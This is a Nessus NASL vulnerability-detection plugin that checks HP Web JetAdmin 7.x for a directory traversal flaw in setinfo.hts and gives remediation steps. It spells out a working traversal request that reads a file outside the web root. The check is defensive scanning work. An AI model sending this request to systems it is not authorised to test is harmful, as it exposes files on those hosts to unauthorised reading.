#
# This script was written by wirepair
#
#
# Tested only on HP Web JetAdmin Version 7.5.2546 checks a file just outside 
# of web root. I didn't want it to check for boot.ini incase its installed on 
# a seperate drive then we'll get a false positive... -wirepair
#



if(description)
{
    script_id(12120);
    script_bugtraq_id(9973);
    script_version ("$Revision: 1.4 $");
    if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2004-B-0007"); 
    name["english"] = "HP Jet Admin 7.x Directory Traversal";
    script_name(english:name["english"]);

    desc["english"] = "
The remote HP Web JetAdmin suffers from a number of vulnerabilities. The 
current running version is vulnerable to a directory traversal attack via i
he setinfo.hts script. A remote attacker can access files by requesting the 
following string:

/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini

Solution: To set a password for the HP Web Jet Admin service follow these steps:
1. In the navigation menu select General Settings, and expand the tree.
2. Expand Profiles Administration
3. Select Add/Remove Profiles
4. In the User Profiles page, if a password has not been set, select the 
'Note: To enable security features, an Admin password must be set.' link.
5. Set an administrator password.

It is strongly recommended that access be restricted by IP Addresses:
1. Expand the General Settings tree.
2. Select the HTTP (Web) branch.
3. Under the 'Allow HP Web Jetadmin Access' add your administration IP host or 
range.  HP Also recommends removing all files that are included in the test 
directory. On a default installation this would be in the directory
C:\Program Files\HP Web Jetadmin\doc\plugins\hpjdwm\script\

See also : http://sh0dan.org/files/hpjadmadv.txt
Risk factor : High";

    script_description(english:desc["english"]);

    summary["english"] = "HP JetAdmin directory traversal attack";

    script_summary(english:summary["english"]);

    script_category(ACT_ATTACK);

    script_copyright(english:"wirepair");

    family["english"] = "General";
    script_family(english:family["english"]);
    script_dependencies("find_service.nes", "http_version.nasl");
    script_require_ports("Services/www", 8443);
    exit(0);
}

include("http_func.inc");

# Check starts here

function https_get(port, request)
{
    if(get_port_state(port))
    {
         if(port == 8443)soc = open_sock_tcp(port, transport:ENCAPS_SSLv23);
	 else soc = open_sock_tcp(port);
         if(soc)
         {
            send(socket:soc, data:request);
            result = http_recv(socket:soc);
            close(soc);
            return(result);
         }
    }
}

debug = 0;

port = get_http_port(default:8443);
banner = get_http_banner(port:port);
if ( "HP Web Jetadmin/" >!< banner ) exit(0);


req = http_get(item:"/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini", port:port);

retval = https_get(port:port, request:req);
if(retval == NULL) exit(0);
if((retval =~ "HTTP/1.[01] 200") && ("Server: HP Web Jetadmin/" >< retval)) 
{
    retval = https_get(port:port, request:req);
    if("traceLogfile=" >< retval)
    {
        security_hole(port);
    }
}
